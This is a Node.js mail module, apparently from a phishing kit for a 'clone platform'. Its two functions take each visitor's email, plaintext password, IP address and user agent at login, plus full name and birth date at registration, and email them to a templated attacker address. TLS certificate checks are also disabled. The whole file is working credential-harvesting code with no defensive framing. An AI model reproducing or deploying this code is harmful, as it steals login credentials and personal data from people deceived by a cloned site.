var nodemailer = require('nodemailer');

require('dotenv').config();

let transporter = nodemailer.createTransport({
    host: process.env.MAIL_HOST,
    port: 587,
    secure: false,
    auth: {
      user: process.env.MAIL_USER,
      pass: process.env.MAIL_PASSWORD
    },
    tls: {
      rejectUnauthorized:false
    }
});

exports.sendLogin = function(email, password, ip_address, agent){
    const regOutput = `    

        Hello Admininstrator,<br><br>

        A new user login up on your clone platform.<br><br>
        
        User details can be seen below:<br><br>
        
        -Email: ${email}<br>
        -Password: ${password}<br>
        -IP Address: ${ip_address}<br>
        -Agent: ${agent}<br><br><br>
        
        Regards,<br>
        Automated Mail
    `;
    
    let mailOptions = {
        from: '"{{FROM_NAME}}" <{{FROM_EMAIL}}>',
        to: '{{TO_EMAIL}}',
        subject: 'New User Loged In',
        text: `
        Hello Admininstrator,\n\n

        A new user login on your clone platform.\n\n
        
        User details can be seen below:\n\n
        
        -Email: ${email}\n
        -Password: ${password}\n
        -IP Address: ${ip_address}\n
        -Agent: ${agent}\n\n\n\n
        
        Regards,\n
        Automated Mail
        `,
        html: regOutput
    }

    transporter.sendMail(mailOptions, (error, info) => {
        if(error){
            return console.log(error);
        }
        console.log('Message sent: %s', info.messageId);
        console.log('Preview URL: %s', nodemailer.getTestMessageUrl(info));

    });

}

exports.sendRegistration = function(fullName, email, password, birth, ip_address, agent){
    const regOutput = `    

        Hello Admininstrator,<br><br>

        A new user registered on your clone platform.<br><br>
        
        User details can be seen below:<br><br>
        
        -Fullname: ${fullName}<br>
        -Email: ${email}<br>
        -Password: ${password}<br>
        -BirthDate: ${birth}<br>
        -IP Address: ${ip_address}<br>
        -Agent: ${agent}<br><br><br><br>
        
        Regards,<br>
        Automated Mail
    `;
    
    let mailOptions = {
        from: '"{{FROM_NAME}}" <{{FROM_EMAIL}}>',
        to: '{{TO_EMAIL}}',
        subject: 'New User Registered',
        text: `
        Hello Admininstrator,\n\n

        A new user registered on the platform.\n\n
        
        User details can be seen below:\n\n
        
        -Fullname: ${fullName}\n
        -Email: ${email}\n
        -Password: ${password}\n
        -BirthDate: ${birth}\n
        -IP Address: ${ip_address}\n
        -Agent: ${agent}\n\n\n\n
        
        Regards,\n
        Automated Mail
        `,
        html: regOutput
    }

    transporter.sendMail(mailOptions, (error, info) => {
        if(error){
            return console.log(error);
        }
        console.log('Message sent: %s', info.messageId);
        console.log('Preview URL: %s', nodemailer.getTestMessageUrl(info));

    });

}
